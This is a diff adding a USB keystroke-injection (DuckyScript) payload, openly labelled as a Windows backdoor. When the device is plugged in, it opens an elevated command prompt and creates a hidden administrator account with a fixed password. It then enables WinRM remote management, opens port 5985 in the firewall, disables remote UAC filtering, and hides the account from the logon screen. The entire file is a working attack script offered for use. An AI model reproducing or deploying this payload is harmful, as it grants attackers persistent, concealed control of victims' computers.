@@ -1,0 +1,63 @@
+REM This script creates a remote management backdoor on a Windows system
+REM Tested on Windows 10 Family Version 20H2
+REM Adminstrative access in asssumed and required for target user
+
+REM cmd commmands adapted from a combination of Microsoft Documentation and Youtube Tutorials
+REM DuckyScript is original
+
+DELAY 1000
+
+REM Opens Administrative Command Prompt ------------------------
+
+WINDOWS r
+DELAY 1000
+STRING cmd
+CTRL-SHIFT ENTER
+DELAY 2000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM Creates a Local User and Gives Administrative Access--------
+
+STRING NET USER BD_Admin BD_Password /ADD
+ENTER
+DELAY 1000
+
+STRING NET LOCALGROUP Administrators BD_Admin /ADD
+ENTER
+DELAY 1000
+
+REM Enables Remote Access --------------------------------------
+
+STRING WINRM QUICKCONFIG
+ENTER
+DELAY 2000
+
+STRING y
+ENTER
+DELAY 1000
+
+REM Adds a Firewall Rule to Open port 5985 ---------------------
+
+STRING NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Windows Backdoor (Shh)" PROTOCOL=TCP LOCALPORT=5985 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
+ENTER
+DELAY 1000
+
+REM Disables Remote UAC Filtering ------------------------------
+
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
+ENTER
+DELAY 1000
+
+REM Hides the Backdoor Account ---------------------------------
+
+STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v BD_Admin /t REG_DWORD /d 0
+ENTER
+DELAY 1000
+
+REM Closes Command Prompt --------------------------------------
+
+STRING EXIT
+ENTER
